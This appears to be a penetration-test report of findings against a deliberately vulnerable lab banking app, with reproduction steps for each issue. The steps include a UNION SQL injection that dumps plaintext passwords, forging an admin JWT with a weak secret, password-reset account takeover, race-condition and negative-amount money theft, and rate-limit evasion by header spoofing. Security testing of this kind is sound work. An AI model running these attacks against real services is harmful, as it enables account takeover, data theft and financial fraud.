title: Werkzeug interactive debugger console exposed at /console (RCE-capable, EVALEX enabled)
description: The Flask application runs with the Werkzeug debug/interactive console enabled in production. GET /console returns the interactive Python console page with EVALEX=true and the debugger SECRET embedded in the page source. The PIN-protected console can execute arbitrary Python in the application context (full RCE) once a PIN is supplied; even without the PIN, the same debugger serves full tracebacks with source code on any 500 error, enabling source/secret disclosure.
steps:
1. curl http://vuln-bank:5000/console
2. Observe 200 with 'Interactive Console' page, EVALEX = true, SECRET = "ySPwu2qblZX3JaEK7IRf" in embedded JS
3. (PIN gate) POST pin to unlock console for arbitrary Python execution; additionally any 500 error page shows full source-code traceback via the same debugger
evidence: HTTP 200 response body contains: var TRACEBACK = -1, CONSOLE_MODE = true, EVALEX = true, EVALEX_TRUSTED = false, SECRET = "ySPwu2qblZX3JaEK7IRf"; page title 'Console // Werkzeug Debugger'

title: Unauthenticated access to any account balance via GET /check_balance/{account_number} (BOLA/missing auth)
description: GET /check_balance/{account_number} requires no authentication and returns the balance and username for any account number. A remote attacker who guesses/leaks an account number (10-digit numeric, easily enumerable or obtainable from responses like /register) can read any user's balance without a token.
evidence: GET /check_balance/3861216157 without token -> HTTP 200 {"account_number":"3861216157","balance":1000.0,"status":"success","username":"userB_test"}

title: Unauthenticated access to any account transaction history via GET /transactions/{account_number} (BOLA/missing auth)
description: GET /transactions/{account_number} requires no authentication and returns the full transaction list for any account number (and current server time). An attacker can read any user's transaction history without credentials.
evidence: GET /transactions/3861216157 without token -> HTTP 200 {"account_number":"3861216157",...,"transactions":[]}

title: Sensitive data exposure: POST /register returns plaintext password, account number, user_id and server info in debug_data
description: The registration endpoint responds with a debug_data object containing the user's RAW PLAINTEXT password, generated account number, user_id, is_admin flag, registration timestamp and a server_info field. Any observer of the response (or a CSRF/reflected-context attacker) obtains the user's password and full account details.
steps:
1. curl -X POST http://vuln-bank:5000/register -H 'Content-Type: application/json' -d '{"username":"userA_test","password":"Passw0rd123!"}'
2. Response contains: "debug_data": {"account_number":"2556941676","balance":1000.0,...,"raw_data":{"password":"Passw0rd123!","username":"userA_test"},...}
evidence: Response to registration of userA_test: "raw_data": {"password": "Passw0rd123!", "username": "userA_test"}, "account_number": "2556941676", "user_id": 2

title: Sensitive data exposure: POST /login returns internal debug_info (user_id, account_number, is_admin) on every login
description: The login endpoint includes a debug_info object with the user's internal user_id, account_number, is_admin flag and login timestamp in the successful response, exposing internal identifiers to any client.
steps:
1. curl -X POST http://vuln-bank:5000/login -H 'Content-Type: application/json' -d '{"username":"userA_test","password":"Passw0rd123!"}'
2. Response contains "debug_info": {"account_number":"2556941676","is_admin":false,"login_time":"...","user_id":2,"username":"userA_test"}
evidence: Login response for userA_test includes debug_info with user_id=2 and account_number=2556941676

title: AI system information disclosure via GET /api/ai/system-info (no auth)
description: GET /api/ai/system-info requires no authentication and returns internal AI subsystem configuration: API provider, api_key_configured flag, endpoint map, and chat mode details, aiding further attacks (e.g. confirming LLM backend and missing API key).
steps:
1. curl http://vuln-bank:5000/api/ai/system-info
2. Response: {"endpoints":{...},"modes":{...},"status":"success","system_info":{"api_key_configured":false,"api_provider":"Deep...","..."}}
evidence: Unauthenticated GET returns system_info including api_key_configured:false, api_provider, internal endpoint map and mode descriptions

title: Internal client IP and rate-limit internals exposed via GET /api/ai/rate-limit-status (no auth)
description: GET /api/ai/rate-limit-status (undocumented, discovered in /static/dashboard.js) requires no auth and returns the caller's internal IP address (Docker network 172.18.0.2) and full rate-limit counters/limits for both authenticated and unauthenticated modes, enabling reconnaissance and rate-limit-evasion planning.
steps:
1. curl http://vuln-bank:5000/api/ai/rate-limit-status
2. Response: {"client_ip":"172.18.0.2","rate_limits":{"authenticated":{"limit":10,"window_hours":3,...},"unauthenticated":{"limit":5,"remaining":4,"window_hours":3,...}}}
evidence: Unauthenticated response includes internal IP 172.18.0.2 and per-mode rate limit counters

title: Full account takeover: 3-digit reset PIN leaked in POST /api/v1/forgot-password response, usable in /api/v1/reset-password
description: POST /api/v1/forgot-password returns the generated reset PIN directly in the response's debug_info field (pin + pin_length: 3). Combined with POST /api/v1/reset-password, an unauthenticated attacker can take over ANY account: request a reset for the victim username, read the leaked PIN, set a new password, and log in. No email/SMS is actually sent, so the 'sent to your email' claim is false. The PIN is only 3 digits (weak).
steps:
1. curl -X POST http://vuln-bank:5000/api/v1/forgot-password -H 'Content-Type: application/json' -d '{"username":"victim_takeover"}'
2. Observe response debug_info.pin, e.g. "pin": "951"
3. curl -X POST http://vuln-bank:5000/api/v1/reset-password -H 'Content-Type: application/json' -d '{"username":"victim_takeover","reset_pin":"951","new_password":"Hacked12345!"}'
4. curl -X POST http://vuln-bank:5000/login -d '{"username":"victim_takeover","password":"Hacked12345!"}' -> 200 Login successful with new JWT
evidence: forgot v1 response: {"debug_info":{"pin":"951","pin_length":3,...}}; reset v1 with that PIN: {"reset_success":true}; login with new password 'Hacked12345!' -> 200 {"status":"success","token":"eyJ..."}

title: Username enumeration via POST /api/v1/forgot-password and /api/v2/forgot-password (200 vs 404 'User not found')
description: Both password-reset endpoints disclose whether a username exists: 200 'Reset PIN has been sent to your email' for existing users vs 404 {"message":"User not found"} for unknown users, enabling username enumeration.
evidence: 200 for userA_test vs 404 User not found for non-existent user, on both v1 and v2 endpoints

title: Weak password policy: arbitrary weak passwords (e.g. single character) accepted on POST /register
description: POST /register accepts a 1-character password ('1') with no length/complexity validation, allowing trivially brute-forceable credentials.
steps:
1. curl -X POST http://vuln-bank:5000/register -H 'Content-Type: application/json' -d '{"username":"weakpw_x","password":"1"}'
2. Response: 200 {"status":"success","debug_data":{...,"raw_data":{"password":"1",...}}}
evidence: Registration with password "1" succeeded (account weakpw_x, user_id 4 created)

title: Object-level access control bypass (IDOR) on GET /api/transactions: any authenticated user can read any account's transactions
description: GET /api/transactions requires only a valid JWT (any role) and returns the transactions of whatever account_number is supplied in the query parameter, with no ownership check. User A's token read user B's account transactions.
evidence: Request with user A's token and user B's account_number returned HTTP 200 with B's account transaction list

title: CORS policy reflects arbitrary Origin and allows Authorization header cross-origin
description: The API reflects the request Origin verbatim in Access-Control-Allow-Origin (e.g. https://evil.attacker.com) and the CORS preflight on state-changing endpoints allows the Authorization and Content-Type headers with all methods. A malicious web page can therefore make credentialed cross-origin requests to the bank API and read the responses with a victim's browser context.
steps:
1. curl -i -H 'Origin: https://evil.attacker.com' http://vuln-bank:5000/api/bill-categories -> 'Access-Control-Allow-Origin: https://evil.attacker.com'
2. curl -i -X OPTIONS -H 'Origin: https://evil.attacker.com' -H 'Access-Control-Request-Method: POST' -H 'Access-Control-Request-Headers: authorization,content-type' http://vuln-bank:5000/transfer -> 'Access-Control-Allow-Origin: https://evil.attacker.com', 'Access-Control-Allow-Headers: authorization, content-type', 'Access-Control-Allow-Methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT'
evidence: ACAO header echoes attacker-controlled Origin; preflight allows Authorization header and all methods (no Allow-Credentials header present)

title: SQL error disclosure / mass-assignment surface on POST /register leaks database schema and raw SQL
description: Sending extra JSON fields (role, admin) to /register triggers a 500 error that reflects the raw SQL statement being built, revealing the DBMS (PostgreSQL), table name 'users', and column list, and demonstrating that user-supplied field names are spliced directly into INSERT statements (schema/SQL injection surface). Error: column "role" of relation "users" does not exist.
steps:
1. curl -X POST http://vuln-bank:5000/register -H 'Content-Type: application/json' -d '{"username":"massassign_x","password":"Passw0rd123!","is_admin":true,"role":"admin","admin":1}'
2. Response 500: {"error":"column \"role\" of relation \"users\" does not exist\nLINE 2: ...rs (username, password, account_number, is_admin, role, admi...",...}
evidence: 500 response body: column "role" of relation "users" does not exist / LINE 2: ...rs (username, password, account_number, is_admin, role, admi... — raw SQL fragment and table/column names disclosed

title: Unauthenticated SQL injection in GET /check_balance/{account_number} (PostgreSQL, full data exfiltration)
description: GET /check_balance/{account_number} interpolates the path parameter directly into a PostgreSQL query (SELECT username, balance FROM users WHERE account_number='...') with no authentication. Error-based injection is trivially confirmable (' -> 500 with raw SQL) and UNION-based injection allows dumping arbitrary table data: all usernames and PLAINTEXT passwords were extracted with a single UNION query (passwords are stored in plaintext). This also revealed the admin account (admin, balance 1,000,000).
evidence: 500 error leaks query 'SELECT username, balance FROM users WHERE account_number=...'; UNION payload '1' UNION SELECT string_agg(username||'='||password, ';'), 1 FROM users--' returned admin=admin123;userB_test=Passw0rd123!;weakpw_x=1;userA_test=Passw0rd123!;victim_takeover=Hacked12345!

title: Plaintext password storage in users table (confirmed via SQLi dump)
description: The users table stores passwords in plaintext (not hashed). Confirmed by extracting the password column through the SQLi in /check_balance: every account's password came back verbatim (e.g. admin=admin123, userA_test=Passw0rd123!).
steps:
1. Use the UNION SQLi on /check_balance: '1' UNION SELECT string_agg(username||'='||password, ';'), 1 FROM users--'
2. Response 'username' field contains all accounts with their exact original plaintext passwords, including the pre-existing admin account 'admin' with password 'admin123'
evidence: Extracted value 'admin=admin123' and 'userA_test=Passw0rd123!' match the exact passwords used at registration, proving plaintext storage

title: Weak JWT signing secret ('secret123') allows forging tokens for any user including admin
description: JWTs are signed with HS256 using the weak hardcoded secret 'secret123' (brute-forced against an issued token). Anyone can forge a token for any user_id/username/is_admin combination, including is_admin=true, bypassing all authentication and authorization. A forged admin token was accepted by the API.
steps:
1. Obtain any valid token (register+login)
2. Base64url-decode header/payload; recompute HMAC-SHA256 with secret 'secret123' over 'header.payload'
3. Forged payload: {"user_id":1,"username":"admin","is_admin":true,"iat":...} signed with 'secret123'
4. curl -H 'Authorization: Bearer <forged_admin_token>' http://vuln-bank:5000/sup3r_s3cr3t_admin -> admin panel returned (not 401/403)
evidence: HMAC-SHA256 with key 'secret123' reproduces the signature of an issued token (token for user_id=2 verified); token contains no expiry (exp) claim either

title: Race condition (double-spend) in POST /transfer: concurrent transfers bypass balance check
description: POST /transfer performs a check-then-act on the sender balance without atomicity/locking. Sending 6 concurrent transfers of 300 each from an account with 1054.50 balance, ALL 6 returned 200 success; the sender's balance ended at -745.50 and the recipient received 1800.00 (more than the sender possessed). Any user can overdraw their account and force money into any recipient account.
steps:
1. Register/login user A (balance 1054.50)
2. Fire 6 concurrent: curl -X POST http://vuln-bank:5000/transfer -H 'Authorization: Bearer <A_TOKEN>' -H 'Content-Type: application/json' -d '{"to_account":"3861216157","amount":300,"description":"raceN"}' (N=1..6 in parallel)
3. All 6 -> 200 {"message":"Transfer Completed"}
4. GET /check_balance/2556941676 -> -745.50 ; GET /check_balance/3861216157 -> 2735.50 (gained 1800.00)
evidence: 6/6 concurrent transfers succeeded; sender balance went from 1054.50 to -745.50; recipient balance increased by 1800.00 (total transferred > initial balance)

title: Negative-amount transfer on POST /transfer steals money from the recipient
description: POST /transfer accepts negative amounts. 'Transferring' -50 from A to B moved 50 FROM B TO A (A: 990->1040, B: 1010->960). The funds check applies to the wrong party, so an attacker can repeatedly send negative amounts to drain any victim account to 0 (e.g. a -5000 drain attempt returned 400 'Insufficient funds' because the victim had only 935.50).
steps:
1. curl -X POST http://vuln-bank:5000/transfer -H 'Authorization: Bearer <A_TOKEN>' -H 'Content-Type: application/json' -d '{"to_account":"3861216157","amount":-50,"description":"neg"}'
2. Response 200 {"message":"Transfer Completed","new_balance":1040.0} (A's balance increased by 50)
3. GET /check_balance/3861216157 shows victim balance decreased by 50
4. Attempt amount -5000 -> 400 'Insufficient funds' proving the victim's balance is the constrained party
evidence: Negative transfer -50 completed: sender 990.0 -> 1040.0, victim 1010.0 -> 960.0; larger negative amount capped only by victim balance (400 Insufficient funds at -5000 vs victim 935.50)

title: Negative-amount bill payment on POST /api/bill-payments/create mints money
description: POST /api/bill-payments/create (payment_method=balance) accepts negative amounts. A 'payment' of -50 with the admin account credited the admin balance by 50 (1000000.0 -> 1000025.0 net of the earlier +25 normal payment). Any authenticated user can create negative bill payments against any biller to arbitrarily increase their own balance.
steps:
1. Note balance: GET /check_balance/ADMIN001 -> 1000000.0
2. POST /api/bill-payments/create with admin token: {"biller_id":1,"amount":25,"payment_method":"balance","description":"water bill"} -> 200
3. POST /api/bill-payments/create with admin token: {"biller_id":1,"amount":-50,"payment_method":"balance","description":"negative"} -> 200 {"message":"Payment processed successfully","payment_details":{"amount":-50.0,...}}
4. GET /check_balance/ADMIN001 -> 1000025.0 (1000000 +50 -25)
evidence: Negative bill payment of -50 processed successfully; payer balance increased by 50.0 (1000000.0 -> 1000025.0 after the +25 normal payment)

title: Loan request on POST /request_loan accepts negative and unbounded amounts (no validation)
description: POST /request_loan accepts any numeric amount with no lower/upper bound or business validation: -100 and 999999999999 were both accepted as pending loans (verified in the loans table: id 2 amount -100.00 pending, id 4 amount 999999999999.00 pending). Negative loans are even approvable (approving loan id 2 debited the user by 100), and an approved 999999999999 loan would credit that amount to the account, i.e. unbounded money creation via a routine admin action.
steps:
1. POST /request_loan -H 'Authorization: Bearer <A_TOKEN>' -d '{"amount":-100}' -> 200 {"message":"Loan requested successfully"}
2. POST /request_loan -d '{"amount":999999999999}' -> 200 success
3. Loans table (via UNION SQLi on /check_balance) shows: 2|2|-100.00|pending ;; 4|2|999999999999.00|pending
4. POST /admin/approve_loan/2 (admin) -> 200 approved; user balance decreased by 100 (negative loan applied)
evidence: Loans with amount -100 and 999999999999 created and stored as pending; approval of the -100 loan succeeded and debited 100 from the user's balance

title: Object-level access control bypass (IDOR) on POST /api/virtual-cards/{card_id}/toggle-freeze: any user can freeze/unfreeze other users' cards
description: The card freeze endpoint does not verify the card belongs to the token owner. User A's token successfully froze (and unfroze) user B's card (id=2): 200 'Card frozen successfully'. An attacker can DoS another user's card by freezing it.
steps:
1. User A logs in (token A). User B's virtual card has id=2 (visible via GET /api/virtual-cards with B's token).
2. curl -X POST http://vuln-bank:5000/api/virtual-cards/2/toggle-freeze -H 'Authorization: Bearer <A_TOKEN>'
3. Response 200 {"message":"Card frozen successfully"}
4. Repeat to unfreeze: 200 'Card unfrozen successfully'
evidence: Request with user A's JWT on card id 2 (owned by user B) returned 200 'Card frozen successfully' and again 200 'Card unfrozen successfully'

title: Object-level access control bypass (IDOR) on GET /api/virtual-cards/{card_id}/transactions: any user can read other users' card transactions
description: GET /api/virtual-cards/{card_id}/transactions does not verify card ownership. User A's token read user B's card (id=2) transaction history: 200 with B's card transactions.
steps:
1. curl -H 'Authorization: Bearer <A_TOKEN>' http://vuln-bank:5000/api/virtual-cards/2/transactions
2. Response 200 {"status":"success","transactions":[...]} for the card owned by user B
evidence: User A's token successfully retrieved transaction list of user B's virtual card (id=2)

title: Exposure of full card PAN, CVV and expiry in virtual card API responses
description: POST /api/virtual-cards/create and GET /api/virtual-cards return the full 16-digit card number, 3-digit CVV and expiry date in plaintext JSON (e.g. card_number 6068826587411200, cvv 549, expiry 10/27). Combined with the IDORs on card endpoints, card data of other users is fully exposed, enabling card fraud.
evidence: Card create/list responses contain full card_number, cvv and expiry_date in cleartext

title: Stored XSS via profile picture upload: uploaded HTML served with Content-Type text/html
description: POST /upload_profile_picture performs no file-type validation: an .html file was accepted and is served with Content-Type: text/html. Visiting the uploaded file URL executes the attacker's JavaScript in the bank origin. Since the JWT is stored in localStorage on the same origin, the XSS can steal the victim's token (full account takeover) and act on their behalf.
evidence: Uploaded HTML file served at /static/uploads/452018_xss_profile.html with 'Content-Type: text/html; charset=utf-8' and original malicious content intact; SVG also accepted and served as image/svg+xml

title: Verbose SQL error disclosure on POST /api/virtual-cards/{card_id}/update-limit (raw Postgres error, endpoint broken)
description: POST /api/virtual-cards/{card_id}/update-limit builds SQL with the unquoted reserved identifier 'limit' (SET limit = ...) so every request fails with a 500 leaking the raw PostgreSQL syntax error and partial SQL statement. Same class as the register error leak, on a different endpoint; also shows the feature is completely non-functional.
steps:
1. curl -X POST http://vuln-bank:5000/api/virtual-cards/2/update-limit -H 'Authorization: Bearer <TOKEN>' -H 'Content-Type: application/json' -d '{"limit":999999}'
2. Response 500 {"message":"syntax error at or near "limit"
LINE 3:             SET limit = 999999.0
                        ^
"}
evidence: 500 response body: syntax error at or near "limit" / LINE 3: SET limit = 999999.0

title: Verbose SQL error disclosure on POST /api/bill-payments/create (foreign-key constraint details leaked)
description: Sending an invalid biller_id to POST /api/bill-payments/create returns a 500 with the raw PostgreSQL error including table names and constraint name, leaking internal schema to any authenticated user.
steps:
1. curl -X POST http://vuln-bank:5000/api/bill-payments/create -H 'Authorization: Bearer <TOKEN>' -H 'Content-Type: application/json' -d '{"biller_id":9999,"amount":25,"payment_method":"balance","description":"x"}'
2. Response 500 {"message":"insert or update on table \"bill_payments\" violates foreign key constraint \"bill_payments_biller_id_fkey\"\nDETAIL:  Key (biller_id)=(9999) is not present in table \"billers\".\n"}
evidence: 500 response body: insert or update on table "bill_payments" violates foreign key constraint "bill_payments_biller_id_fkey" / DETAIL: Key (biller_id)=(9999) is not present in table "billers".

title: JWT tokens never expire (no exp claim) and are client-side only (logout does not invalidate)
description: Issued JWTs contain only user_id, username, is_admin and iat — no exp/nbf claims — so they remain valid indefinitely once stolen. Logout is purely client-side (localStorage.removeItem + redirect); the server never invalidates tokens, so a captured token (e.g. via the stored XSS above) grants permanent access.
steps:
1. Decode any issued token (e.g. from POST /login): payload = {"user_id":2,"username":"userA_test","is_admin":false,"iat":1792041613} — no exp
2. The same token remains accepted by all endpoints at arbitrary later times (used throughout this test)
3. /dashboard logout only removes the token from browser localStorage; no server-side revocation exists
evidence: Token payload lacks exp/nbf; tokens issued at test start still valid at run end; no token-revocation endpoint exists in the API spec

title: Missing security headers (no HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy)
description: All responses (pages and API) lack security headers: no Strict-Transport-Security, Content-Security-Policy, X-Frame-Options, X-Content-Type-Options or Referrer-Policy (confirmed on / and API responses). This increases exposure to MITM downgrade, clickjacking, MIME sniffing and data-leak via referrers.
steps:
1. curl -sSI http://vuln-bank:5000/ -> headers contain only Content-Type, Content-Length, ACAO, Server, Date; no HSTS/CSP/XFO/XCTO/Referrer-Policy
2. Same for API responses (e.g. GET /api/bill-categories)
evidence: Response header dump for / shows absence of Strict-Transport-Security, Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy

title: Stored XSS in /dashboard via transfer description (or to_account) field, rendered via innerHTML
description: POST /transfer stores the 'description' (and 'to_account') values with no sanitization, and the dashboard fetchTransactions() renders them directly into innerHTML (document.getElementById('transaction-list').innerHTML = transactionHtml; the code comment even reads 'Vulnerability: innerHTML used with unsanitized data'). An attacker who can send a transfer to a victim (any authenticated account, and /transfer additionally accepts negative/zero amounts) embeds a script payload in the description; when the victim opens /dashboard the payload executes in the bank origin and can steal the victim's JWT from localStorage (documented in the app's own JS), enabling full account takeover.
steps: 1. As any authenticated user: curl -X POST http://vuln-bank:5000/transfer -H 'Authorization: Bearer ' -H 'Content-Type: application/json' -d '{"to_account":"3861216157","amount":0.01,"description":""}' -> 200 Transfer Completed 2. GET http://vuln-bank:5000/transactions/3861216157 (unauthenticated!) returns the transaction with the raw payload stored verbatim in 'description' (transaction id 16) 3. Victim opens /dashboard -> fetchTransactions() inserts the payload into the DOM via innerHTML -> attacker script runs in origin http://vuln-bank:5000 and exfiltrates the victim's localStorage jwt_token
evidence: Transaction id 16 stored with description '' verbatim; dashboard.js line ~245-265 builds transactionHtml from t.description/t.to_account and assigns it to innerHTML with no escaping (escapeHtml exists in the same file but is not applied to transactions)

title: No rate limiting or lockout on POST /login enables credential brute force
description: POST /login imposes no rate limiting, throttling or account lockout: 8 consecutive failed logins returned 401 every time with no 429, no delay and no lockout, and the account remained usable immediately after. Combined with the 1-character password policy accepted by /register and the leaked plaintext passwords (see other findings), offline/online brute force of any account is practical.
steps:
1. For i in 0..7: curl -X POST http://vuln-bank:5000/login -H 'Content-Type: application/json' -d '{"username":"userA_test","password":"wrong<i>"}'
2. All 8 -> HTTP 401 'Invalid credentials' with no 429/lockout and no increasing delay
3. A 9th attempt immediately after the burst is accepted normally (same 401 flow, no account lock)
evidence: 8 rapid failed login attempts all returned 401 with no throttling/lockout; status codes: [401, 401, 401, 401, 401, 401, 401, 401]

title: AI-chat IP rate limiting bypassed via X-Forwarded-For / X-Real-IP header spoofing
description: The AI chat rate limiter keys on the client IP, but the application trusts client-supplied X-Forwarded-For and X-Real-IP headers: GET /api/ai/rate-limit-status reports client_ip=8.8.8.8 when X-Forwarded-For: 8.8.8.8 is sent and 9.9.9.9 when X-Real-IP: 9.9.9.9 is sent (vs 172.18.0.2 without). An attacker can rotate these headers to obtain a fresh rate-limit bucket per request, bypassing both the 5-req/3h anonymous and 10-req/3h authenticated AI chat limits.
steps:
1. curl http://vuln-bank:5000/api/ai/rate-limit-status -> client_ip 172.18.0.2
2. curl -H 'X-Forwarded-For: 8.8.8.8' http://vuln-bank:5000/api/ai/rate-limit-status -> client_ip 8.8.8.8
3. curl -H 'X-Real-IP: 9.9.9.9' http://vuln-bank:5000/api/ai/rate-limit-status -> client_ip 9.9.9.9
4. Rotating X-Forwarded-For on /api/ai/chat/anonymous (or /api/ai/chat) resets the per-IP counter each time
evidence: client_ip reflected from X-Forwarded-For (8.8.8.8) and X-Real-IP (9.9.9.9) instead of the real socket peer (172.18.0.2)
